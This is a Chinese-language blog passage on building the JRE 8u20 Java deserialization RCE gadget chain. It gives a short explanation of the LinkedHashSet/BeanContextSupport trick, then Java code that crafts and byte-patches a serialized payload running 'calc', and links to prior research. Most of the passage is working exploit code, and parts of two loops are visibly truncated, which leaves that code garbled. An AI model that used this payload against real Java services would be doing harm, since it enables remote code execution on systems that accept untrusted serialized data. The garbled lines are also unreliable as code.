# 构造 jre8u20 Gadget
在掌握了上述知识点后，我们就已经可以构造 jre8u20 Gadget了，语言描述比较困难，用一张图进行说明。  
在进行序列化的时候，向序列化流中写入了`4`个对象，但是通过修改序列化中的一些特殊的`byte`，构造了一个我们想要的序列化流。在反序列化的时候，`LinkedHashSet`读到的`size`为`3`,在反序列化第一个对象`BeanContextSupport`的时候，会进入到`BeanContextSupport`的`readChildren`逻辑，成功将`AnnotationInvocationHander`进行了还原（虽然`AnnotationInvocationHander`在反序列化的时候会抛出异常，但是`BeanContextSupport`捕捉了异常）。随后`LinkedHashSet`在反序列化第二个和三个元素的时候，会发生哈希碰撞，从而导致`RCE`。  
代码如下（相关代码已上传至[github](https://github.com/feihong-cs/jre8u20_gadget "github")）：
    final Object templates = Gadgets.createTemplatesImpl("calc");
            String zeroHashCodeStr = "f5a5a608";
            HashMap map = new HashMap();
            map.put(zeroHashCodeStr, "foo");
            InvocationHandler handler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
            Reflections.setFieldValue(handler, "type", Templates.class);
            Templates proxy = Gadgets.createProxy(handler, Templates.class);
            Reflections.setFieldValue(templates, "_auxClasses", null);
            Reflections.setFieldValue(templates, "_class", null);
            map.put(zeroHashCodeStr, templates); // swap in real object
            LinkedHashSet set = new LinkedHashSet();
            BeanContextSupport bcs = new BeanContextSupport();
            Class cc = Class.forName("java.beans.beancontext.BeanContextSupport");
            Field serializable = cc.getDeclaredField("serializable");
            serializable.setAccessible(true);
            serializable.set(bcs, 0);
            Field beanContextChildPeer = cc.getSuperclass().getDeclaredField("beanContextChildPeer");
            beanContextChildPeer.set(bcs, bcs);
            set.add(bcs);
            //序列化
            ByteArrayOutputStream baous = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baous);
            oos.writeObject(set);
            oos.writeObject(handler);
            oos.writeObject(templates);
            oos.writeObject(proxy);
            oos.close();
            byte[] bytes = baous.toByteArray();
            System.out.println("[+] Modify HashSet size from  1 to 3");
            bytes[89] = 3; //修改hashset的长度（元素个数）
            //调整 TC_ENDBLOCKDATA 标记的位置
            //0x73 = 115, 0x78 = 120
            //0x73 for TC_OBJECT, 0x78 for TC_ENDBLOCKDATA
            for(int i = 0; i  deserialize(ois, bcmListeners = new ArrayList(1))
            // -> count = ois.readInt(); 报错，无法完成整个反序列化流程
            // 没有 SC_WRITE_METHOD 标记，认为这个反序列流到此就结束了
            // 标记： 7375 6e2e 7265 666c 6563 --> sun.reflect...
            for(int i = 0; i  classDescFlags from SC_SERIALIZABLE to " +
                            "SC_SERIALIZABLE | SC_WRITE_METHOD");
                    i = i + 58;
                    bytes[i] = 3;
                    break;
                }
            }
            //加回之前删除的 TC_BLOCKDATA，表明 HashSet 到此结束
            System.out.println("[+] Add TC_BLOCKDATA at end");
            bytes = Util.addAtLast(bytes, (byte) 0x78);
            FileOutputStream fous = new FileOutputStream("jre8u20.ser");
            fous.write(bytes);
            //反序列化
            FileInputStream fis = new FileInputStream("jre8u20.ser");
            ObjectInputStream ois = new ObjectInputStream(fis);
            ois.readObject();
            ois.close();
运行结果：  
# 参考
[pwntester/JRE8u20_RCE_Gadget](https://github.com/pwntester/JRE8u20_RCE_Gadget)  
[JRE8u20反序列化漏洞分析](https://www.freebuf.com/vuls/176672.html "JRE8u20反序列化漏洞分析")  
[深度 - Java 反序列化 Payload 之
JRE8u20](https://mp.weixin.qq.com/s/Daipik5qK6cIuYl49G-n4Q?)  
[JRE8u20 反序列化](https://xz.aliyun.com/t/7240)